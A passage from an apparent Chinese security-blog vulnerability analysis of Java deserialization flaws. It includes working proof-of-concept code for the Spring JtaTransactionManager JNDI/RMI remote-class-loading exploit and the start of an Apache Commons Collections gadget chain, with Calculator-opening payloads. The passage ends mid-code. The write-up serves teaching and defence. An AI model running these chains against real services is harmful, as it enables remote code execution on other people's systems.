<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>深入理解 JAVA 反序列化漏洞</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">深入理解 JAVA 反序列化漏洞</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-06-09" class="timeago">3 月，1 周 之前</time>
          <time datetime="2017-06-09" class="fulldate">六月 09, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/vul-analysis/">漏洞分析</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p><input type="hidden" class="Authorrss"  value="斗象科技能力中心" name="斗象科技能力中心" />
作者：<a href="https://www.vulbox.com/knowledge/detail/?id=11"><strong>斗象科技能力中心(E_Bwill@TCC)</strong></a></p>
<h5>1. Java 序列化与反序列化</h5>
<blockquote>
<p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。</p>
<p>Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p>
</blockquote>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968351093909.png-w331s" /></p>
<p>序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。主要应用在以下场景：</p>
<blockquote>
<p>HTTP：多平台之间的通信，管理等</p>
<p>RMI：是 Java 的一组拥护开发分布式应用程序的 API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是 1099 端口。</p>
<p>JMX：JMX 是一套标准的代理和服务，用户可以在任何 Java 应用程序中使用这些代理和服务实现管理,中间件软件 WebLogic 的管理页面就是基于 JMX 开发的，而 JBoss 则整个系统都基于 JMX 构架。 ​</p>
</blockquote>
<h5>2. 漏洞历史</h5>
<blockquote>
<p>最为出名的大概应该是：15年的Apache Commons Collections 反序列化远程命令执行漏洞，其当初影响范围包括：WebSphere、JBoss、Jenkins、WebLogic 和 OpenNMSd等。</p>
<p>2016年Spring RMI反序列化漏洞今年比较出名的：Jackson，FastJson</p>
</blockquote>
<p>Java 十分受开发者喜爱的一点是其拥有完善的第三方类库，和满足各种需求的框架；但正因为很多第三方类库引用广泛，如果其中某些组件出现安全问题，那么受影响范围将极为广泛。</p>
<h5>3. 漏洞成因</h5>
<p>暴露或间接暴露反序列化 API ，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码</p>
<p>两个或多个看似安全的模块在同一运行环境下，共同产生的安全问题 ​</p>
<h5>4. 漏洞基本原理</h5>
<p>实现序列化与反序列化</p>
<div class="codehilite"><pre><span></span>public class test{
    public static void main(String args[])throws Exception{
          //定义obj对象
        String obj=&quot;hello world!&quot;;
          //创建一个包含对象进行反序列化信息的”object”数据文件
        FileOutputStream fos=new FileOutputStream(&quot;object&quot;);
        ObjectOutputStream os=new ObjectOutputStream(fos);
          //writeObject()方法将obj对象写入object文件
        os.writeObject(obj);
        os.close();
          //从文件中反序列化obj对象
        FileInputStream fis=new FileInputStream(&quot;object&quot;);
        ObjectInputStream ois=new ObjectInputStream(fis);
          //恢复对象
        String obj2=(String)ois.readObject();
        System.out.print(obj2);
        ois.close();
    }
}
</pre></div>


<p>上面代码将 String 对象 obj1 序列化后写入文件 object 文件中，后又从该文件反序列化得到该对象。我们来看一下 object 文件中的内容：
<img alt="" src="https://images.seebug.org/content/images/2017/06/14968351249563.png-w331s" /></p>
<p>这里需要注意的是，<code>ac ed 00 05</code>是 java 序列化内容的特征，如果经过 base64 编码，那么相对应的是<code>rO0AB</code>：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968351356529.png-w331s" /></p>
<p>我们再看一段代码：</p>
<div class="codehilite"><pre><span></span><span class="kr">public</span> <span class="kr">class</span> <span class="nx">test</span><span class="p">{</span>
    <span class="kr">public</span> <span class="kr">static</span> <span class="k">void</span> <span class="nx">main</span><span class="p">(</span><span class="nb">String</span> <span class="nx">args</span><span class="p">[])</span> <span class="kr">throws</span> <span class="nx">Exception</span><span class="p">{</span>
        <span class="c1">//定义myObj对象</span>
        <span class="nx">MyObject</span> <span class="nx">myObj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MyObject</span><span class="p">();</span>
        <span class="nx">myObj</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">&quot;hi&quot;</span><span class="p">;</span>
        <span class="c1">//创建一个包含对象进行反序列化信息的”object”数据文件</span>
        <span class="nx">FileOutputStream</span> <span class="nx">fos</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileOutputStream</span><span class="p">(</span><span class="s2">&quot;object&quot;</span><span class="p">);</span>
        <span class="nx">ObjectOutputStream</span> <span class="nx">os</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ObjectOutputStream</span><span class="p">(</span><span class="nx">fos</span><span class="p">);</span>
        <span class="c1">//writeObject()方法将myObj对象写入object文件</span>
        <span class="nx">os</span><span class="p">.</span><span class="nx">writeObject</span><span class="p">(</span><span class="nx">myObj</span><span class="p">);</span>
        <span class="nx">os</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
        <span class="c1">//从文件中反序列化obj对象</span>
        <span class="nx">FileInputStream</span> <span class="nx">fis</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileInputStream</span><span class="p">(</span><span class="s2">&quot;object&quot;</span><span class="p">);</span>
        <span class="nx">ObjectInputStream</span> <span class="nx">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ObjectInputStream</span><span class="p">(</span><span class="nx">fis</span><span class="p">);</span>
        <span class="c1">//恢复对象</span>
        <span class="nx">MyObject</span> <span class="nx">objectFromDisk</span> <span class="o">=</span> <span class="p">(</span><span class="nx">MyObject</span><span class="p">)</span><span class="nx">ois</span><span class="p">.</span><span class="nx">readObject</span><span class="p">();</span>
        <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nx">println</span><span class="p">(</span><span class="nx">objectFromDisk</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
        <span class="nx">ois</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kr">class</span> <span class="nx">MyObject</span> <span class="kr">implements</span> <span class="nx">Serializable</span><span class="p">{</span>
    <span class="kr">public</span> <span class="nb">String</span> <span class="nx">name</span><span class="p">;</span>
    <span class="c1">//重写readObject()方法</span>
    <span class="kr">private</span> <span class="k">void</span> <span class="nx">readObject</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ObjectInputStream</span> <span class="k">in</span><span class="p">)</span> <span class="kr">throws</span> <span class="nx">IOException</span><span class="p">,</span> <span class="nx">ClassNotFoundException</span><span class="p">{</span>
        <span class="c1">//执行默认的readObject()方法</span>
        <span class="k">in</span><span class="p">.</span><span class="nx">defaultReadObject</span><span class="p">();</span>
        <span class="c1">//执行打开计算器程序命令</span>
        <span class="nx">Runtime</span><span class="p">.</span><span class="nx">getRuntime</span><span class="p">().</span><span class="nx">exec</span><span class="p">(</span><span class="s2">&quot;open /Applications/Calculator.app/&quot;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>


<p>这次我们自己写了一个 class 来进行对象的序列与反序列化。我们看到，MyObject 类有一个公有属性 name ，myObj 实例化后将 myObj.name 赋值为了 “hi” ，然后序列化写入文件 object：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968351517677.png-w331s" /></p>
<p>然后读取 object 反序列化时：
<img alt="" src="https://images.seebug.org/content/images/2017/06/14968351623898.png-w331s" /></p>
<p>我们注意到 MyObject 类实现了<code>Serializable</code>接口，并且重写了<code>readObject()</code>函数。这里需要注意：<strong>只有实现了Serializable接口的类的对象才可以被序列化</strong>，Serializable 接口是启用其序列化功能的接口，实现 java.io.Serializable 接口的类才是可序列化的，没有实现此接口的类将不能使它们的任一状态被序列化或逆序列化。这里的 readObject() 执行了<code>Runtime.getRuntime().exec("open /Applications/Calculator.app/")</code>，而 readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，readObject() 是可以重写的，可以定制反序列化的一些行为。</p>
<h5>5. 安全隐患</h5>
<p>看完上一章节你可能会说不会有人这么写 readObject() ，当然不会，但是实际也不会太差。</p>
<p>我们看一下 2016 年的 Spring 框架的反序列化漏洞，该漏洞是利用了 RMI 以及 JNDI：</p>
<blockquote>
<p>RMI(Remote Method Invocation) 即 Java 远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为 JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)以及
 CORBA。</p>
<p>JNDI (Java Naming and Directory Interface) 是一个应用程序设计的 API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。JNDI 支持的服务主要有以下几种：DNS、LDAP、 CORBA 对象服务、RMI 等。</p>
</blockquote>
<p>简单的来说就是RMI注册的服务可以让 JNDI 应用程序来访问，调用。</p>
<p>Spring 框架中的远程代码执行的缺陷在于spring-tx-xxx.jar中的org.springframework.transaction.jta.JtaTransactionManager类，该类实现了 Java Transaction API，主要功能是处理分布式的事务管理。</p>
<p>这里我们来分析一下该漏洞的原理，为了复现该漏洞，我们模拟搭建 Server 和 Client 服务；Server 主要功能是主要功能就是监听某个端口，读取送达该端口的序列化后的对象，然后反序列化还原得到该对象；Client 负责发送序列化后的对象。运行环境需要在 Spring 框架下。</p>
<p>（PoC来自 <strong><a href="http://github.com/zerothoughts/spring-jndi">zerothoughts</a></strong>  ）</p>
<p>我们首先来看 server 代码：</p>
<div class="codehilite"><pre><span></span>public class ExploitableServer {
   public static void main(String[] args) {
       {
         //创建socket
         ServerSocket serverSocket = new ServerSocket(Integer.parseInt(&quot;9999&quot;));
         System.out.println(&quot;Server started on port &quot;+serverSocket.getLocalPort());
         while(true) {
            //等待链接
            Socket socket=serverSocket.accept();
            System.out.println(&quot;Connection received from &quot;+socket.getInetAddress());            
            ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream());
            try {
               //读取对象
               Object object = objectInputStream.readObject();
               System.out.println(&quot;Read object &quot;+object);                         
            } catch(Exception e) {
               System.out.println(&quot;Exception caught while reading object&quot;);                           
               e.printStackTrace();
            }           
         }
      } catch(Exception e) {
         e.printStackTrace();
      }
   }
}
</pre></div>


<p>client:</p>
<div class="codehilite"><pre><span></span><span class="nt">public</span> <span class="nt">class</span> <span class="nt">ExploitClient</span> <span class="p">{</span>
    <span class="err">public</span> <span class="err">static</span> <span class="err">void</span> <span class="err">main(String</span><span class="cp">[]</span> <span class="err">args)</span> <span class="err">{</span>
        <span class="err">try</span> <span class="err">{</span>
            <span class="err">String</span> <span class="err">serverAddress</span> <span class="err">=</span> <span class="err">args</span><span class="cp">[</span><span class="mi">0</span><span class="cp">]</span><span class="p">;</span>
            <span class="err">int</span> <span class="err">port</span> <span class="err">=</span> <span class="err">Integer.parseInt(args</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span><span class="err">)</span><span class="p">;</span>
            <span class="err">String</span> <span class="err">localAddress=</span> <span class="err">args</span><span class="cp">[</span><span class="mi">2</span><span class="cp">]</span><span class="p">;</span>
            <span class="err">//启动web</span> <span class="err">server，提供远程下载要调用类的接口</span>
            <span class="err">System.out.println(&quot;Starting</span> <span class="err">HTTP</span> <span class="err">server&quot;)</span><span class="p">;</span>
            <span class="err">HttpServer</span> <span class="err">httpServer</span> <span class="err">=</span> <span class="err">HttpServer.create(new</span> <span class="err">InetSocketAddress(8088),</span> <span class="err">0)</span><span class="p">;</span>
            <span class="err">httpServer.createContext(&quot;/&quot;,new</span> <span class="err">HttpFileHandler())</span><span class="p">;</span>
            <span class="err">httpServer.setExecutor(null)</span><span class="p">;</span>
            <span class="err">httpServer.start()</span><span class="p">;</span>
            <span class="err">//下载恶意类的地址</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="o">:</span><span class="mi">8088</span><span class="o">/</span><span class="n">ExportObject</span><span class="o">.</span><span class="n">class</span>
            <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="nf">println</span><span class="p">(</span><span class="s2">&quot;Creating RMI Registry&quot;</span><span class="p">);</span>
            <span class="err">Registry</span> <span class="err">registry</span> <span class="err">=</span> <span class="err">LocateRegistry.createRegistry(1099)</span><span class="p">;</span>
            <span class="err">Reference</span> <span class="err">reference</span> <span class="err">=</span> <span class="err">new</span> <span class="err">javax.naming.Reference(&quot;ExportObject&quot;,&quot;ExportObject&quot;,&quot;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="s2">&quot;+serverAddress+&quot;</span><span class="o">/</span><span class="s2">&quot;);</span>
<span class="s2">            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span>
<span class="s2">            registry.bind(&quot;</span><span class="n">Object</span><span class="s2">&quot;, referenceWrapper);</span>

<span class="s2">            System.out.println(&quot;</span><span class="n">Connecting</span> <span class="kc">to</span> <span class="n">server</span> <span class="s2">&quot;+serverAddress+&quot;</span><span class="o">:</span><span class="s2">&quot;+port);</span>
<span class="s2">            Socket socket=new Socket(serverAddress,port);</span>
<span class="s2">            System.out.println(&quot;</span><span class="n">Connected</span> <span class="kc">to</span> <span class="n">server</span><span class="s2">&quot;);</span>
<span class="s2">            //jndi的调用地址</span>
<span class="s2">            String jndiAddress = &quot;</span><span class="n">rmi</span><span class="o">://</span><span class="s2">&quot;+localAddress+&quot;</span><span class="o">:</span><span class="mi">1099</span><span class="o">/</span><span class="n">Object</span><span class="s2">&quot;;</span>
<span class="s2">            org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();</span>
<span class="s2">            object.setUserTransactionName(jndiAddress);</span>
<span class="s2">            //发送payload</span>
<span class="s2">            System.out.println(&quot;</span><span class="n">Sending</span> <span class="n">object</span> <span class="kc">to</span> <span class="n">server</span><span class="o">...</span><span class="err">&quot;</span><span class="p">);</span>
            <span class="err">ObjectOutputStream</span> <span class="err">objectOutputStream</span> <span class="err">=</span> <span class="err">new</span> <span class="err">ObjectOutputStream(socket.getOutputStream())</span><span class="p">;</span>
            <span class="err">objectOutputStream.writeObject(object)</span><span class="p">;</span>
            <span class="err">objectOutputStream.flush()</span><span class="p">;</span>
            <span class="err">while(true)</span> <span class="err">{</span>
                <span class="err">Thread.sleep(1000)</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="err">}</span> <span class="nt">catch</span><span class="o">(</span><span class="nt">Exception</span> <span class="nt">e</span><span class="o">)</span> <span class="p">{</span>
            <span class="err">e.printStackTrace()</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="err">}</span>
<span class="err">}</span>
</pre></div>


<p>最后是 ExportObject ，包含测试用执行的命令：</p>
<div class="codehilite"><pre><span></span>public class ExportObject {
   public static String exec(String cmd) throws Exception {
      String sb = &quot;&quot;;
      BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
      BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
      String lineStr;
      while ((lineStr = inBr.readLine()) != null)
         sb += lineStr + &quot;\n&quot;;
      inBr.close();
      in.close();
      return sb;
   }
   public ExportObject() throws Exception {
      String cmd=&quot;open /Applications/Calculator.app/&quot;;
      throw new Exception(exec(cmd));
   }
}
</pre></div>


<p>先开启 server，再运行 client 后：
<img alt="" src="https://images.seebug.org/content/images/2017/06/14968351868587.png-w331s" /></p>
<p>我们简单的看一下流程。
<img alt="" src="https://images.seebug.org/content/images/2017/06/14968351994824.png-w331s" /></p>
<p>这里向 Server 发送的 Payload 是：</p>
<div class="codehilite"><pre><span></span>        <span class="o">//</span> <span class="nt">jndi的调用地址</span>
        <span class="nt">String</span> <span class="nt">jndiAddress</span> <span class="o">=</span> <span class="s2">&quot;rmi://127.0.0.1:1999/Object&quot;</span><span class="o">;</span>
        <span class="o">//</span> <span class="nt">实例化JtaTransactionManager对象</span><span class="err">，</span><span class="nt">并且初始化UserTransactionName成员变量</span>
        <span class="nt">JtaTransactionManager</span> <span class="nt">object</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">JtaTransactionManager</span><span class="o">();</span>
        <span class="nt">object</span><span class="p">.</span><span class="nc">setUserTransactionName</span><span class="o">(</span><span class="nt">jndiAddress</span><span class="o">);</span>
</pre></div>


<p>上文已经说了，JtaTransactionManager 类存在问题，最终导致了漏洞的实现，这里向 Server 发送的序列化后的对象就是 JtaTransactionManager 的对象。JtaTransactionManager 实现了 Java Transaction API，即 JTA，JTA 允许应用程序执行分布式事务处理——在两个或多个网络计算机资源上访问并且更新数据。</p>
<p>上文已经介绍过了，反序列化时会调用被序列化类的 readObject() 方法，readObject() 可以重写而实现一些其他的功能，我们看一下 JtaTransactionManager 类的 readObject() 方法：</p>
<div class="codehilite"><pre><span></span>private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        // Rely on default serialization; just initialize state after deserialization.
        ois.defaultReadObject();

        // Create template for client-side JNDI lookup.
        this.jndiTemplate = new JndiTemplate();

        // Perform a fresh lookup for JTA handles.
        initUserTransactionAndTransactionManager();
        initTransactionSynchronizationRegistry();
    }
</pre></div>


<p>方法 initUserTransactionAndTransactionManager() 是用来初始化 UserTransaction 以及
 TransactionManager，在该方法中，我们可以看到：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968352124984.png-w331s" />
lookupUserTransaction() 方法会调用 JndiTemplate 的 lookup() 方法：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968352279099.png-w331s" /></p>
<p>可以看到 lookup() 方法作用是：<strong>Look up the object with the given name in the current JNDI context.</strong> 而就是使用 JtaTransactionManager 类的 userTransactionName 属性，因此我们可以看到上文中我们序列化的 JtaTransactionManager 对象使用了 setUserTransactionName() 方法将jndiAddress 即 "rmi://127.0.0.1:1999/Object" ; 赋给了 userTransactionName。</p>
<p>至此，该漏洞的核心也明了了：
<img alt="" src="https://images.seebug.org/content/images/2017/06/14968352427378.png-w331s" /></p>
<p>我们来看一下上文中 userTransactionName 指向的 “rmi://127.0.0.1:1999/Object” 是如何实现将恶意类返回给 Server 的：</p>
<div class="codehilite"><pre><span></span>        <span class="o">//</span> <span class="nt">注册端口1999</span>
        <span class="nt">Registry</span> <span class="nt">registry</span> <span class="o">=</span> <span class="nt">LocateRegistry</span><span class="p">.</span><span class="nc">createRegistry</span><span class="o">(</span><span class="nt">1999</span><span class="o">);</span>
        <span class="o">//</span> <span class="nt">设置code</span> <span class="nt">url</span> <span class="nt">这里即为http</span><span class="o">://</span><span class="nt">http</span><span class="o">://</span><span class="nt">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="p">:</span><span class="nd">8000</span><span class="o">/</span>
        <span class="o">//</span> <span class="nt">最终下载恶意类的地址为http</span><span class="o">://</span><span class="nt">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="p">:</span><span class="nd">8000</span><span class="o">/</span><span class="nt">ExportObject</span><span class="p">.</span><span class="nc">class</span>
        <span class="nt">Reference</span> <span class="nt">reference</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">Reference</span><span class="o">(</span><span class="s2">&quot;ExportObject&quot;</span><span class="o">,</span> <span class="s2">&quot;ExportObject&quot;</span><span class="o">,</span> <span class="s2">&quot;http://127.0.0.1:8000/&quot;</span><span class="o">);</span>
        <span class="o">//</span> <span class="nt">Reference包装类</span>
        <span class="nt">ReferenceWrapper</span> <span class="nt">referenceWrapper</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">ReferenceWrapper</span><span class="o">(</span><span class="nt">reference</span><span class="o">);</span>
        <span class="nt">registry</span><span class="p">.</span><span class="nc">bind</span><span class="o">(</span><span class="s2">&quot;Object&quot;</span><span class="o">,</span> <span class="nt">referenceWrapper</span><span class="o">);</span>
</pre></div>


<p>这里的<strong>Reference reference = new Reference("ExportObject", "ExportObject", "http://127.0.0.1:8000/");</strong> 可以看到，最终会返回的类的是http://127.0.0.1:8000/ExportObject.class ，即上文中贴出的ExportObject，该类中的构造函数包含执行 “open /Applications/Calculator.app/” 代码。发送 Payload：</p>
<div class="codehilite"><pre><span></span>        //制定Server的IP和端口
        Socket socket = new Socket(&quot;127.0.0.1&quot;, 9999);
        ObjectOutputStream objectOutputStream = new                 ObjectOutputStream(socket.getOutputStream());
        //发送object
        objectOutputStream.writeObject(object);
        objectOutputStream.flush();
        socket.close();
</pre></div>


<p><strong>小结</strong></p>
<p>利用了 JtaTransactionManager 类中可以被控制的 readObject() 方法，从而构造恶意的被序列化类，其中利用 readObject() 会触发远程恶意类中的构造函数这一点，达到目的。</p>
<h5>6. JAVA Apache-CommonsCollections 序列化RCE漏洞分析</h5>
<p>Apache Commons Collections 序列化 RCE 漏洞问题主要出现在
 org.apache.commons.collections.Transformer 接口上；在 Apache Commons Collections 中有一个
 InvokerTransformer 类实现了 Transformer，主要作用是调用 Java 的反射机制(反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性，详细内容请参考：http://ifeve.com/java-reflection/) 来调用任意函数，只需要传入方法名、参数类型和参数，即可调用任意函数。TransformedMap 配合sun.reflect.annotation.AnnotationInvocationHandler 中的 readObject()，可以触发漏洞。我们先来看一下大概的逻辑：
<img alt="" src="https://images.seebug.org/content/images/2017/06/14968352819375.png-w331s" /></p>
<p>我们先来看一下Poc：</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.File</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.lang.annotation.Retention</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span>
<span class="n">public</span> <span class="k">class</span> <span class="nc">test3</span> <span class="p">{</span>
    <span class="n">public</span> <span class="n">static</span> <span class="n">Object</span> <span class="n">Reverse_Payload</span><span class="p">()</span> <span class="n">throws</span> <span class="ne">Exception</span> <span class="p">{</span>
        <span class="n">Transformer</span><span class="p">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Transformer</span><span class="p">[]</span> <span class="p">{</span>
                <span class="n">new</span> <span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="o">.</span><span class="n">class</span><span class="p">),</span>
                <span class="n">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s2">&quot;getMethod&quot;</span><span class="p">,</span> <span class="n">new</span> <span class="n">Class</span><span class="p">[]</span> <span class="p">{</span> <span class="n">String</span><span class="o">.</span><span class="n">class</span><span class="p">,</span> <span class="n">Class</span><span class="p">[]</span><span class="o">.</span><span class="k">class</span> <span class="err">}, </span><span class="nc">new</span> <span class="n">Object</span><span class="p">[]</span> <span class="p">{</span> <span class="s2">&quot;getRuntime&quot;</span><span class="p">,</span> <span class="n">new</span> <span class="n">Class</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">}),</span>
                <span class="n">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s2">&quot;invoke&quot;</span><span class="p">,</span> <span class="n">new</span> <span class="n">Class</span><span class="p">[]</span> <span class="p">{</span> <span class="n">Object</span><span class="o">.</span><span class="n">class</span><span class="p">,</span> <span class="n">Object</span><span class="p">[]</span><span class="o">.</span><span class="k">class</span> <span class="err">}, </span><span class="nc">new</span> <span class="n">Object</span><span class="p">[]</span> <span class="p">{</span> <span class="n">null</span><span class="p">,</span> <span class="n">new</span> <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">}),</span>
                <span class="n">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">,</span> <span class="n">new</span> <span class="n">Class</span><span class="p">[]</span> <span class="p">{</span> <span class="n">String</span><span class="o">.</span><span class="k">class</span> <span class="err">}, </span><span class="nc">new</span> <span class="n">Object</span><span class="p">[]</span> <span class="p">{</span> <span class="s2">&quot;open /Applications/Calculator.app&quot;</span> <span class="p">})</span> <span class="p">};</span>
        <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span>

        <span class="n">Map</span> <span class="n">innermap</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HashMap</span><span class="p">();</span>
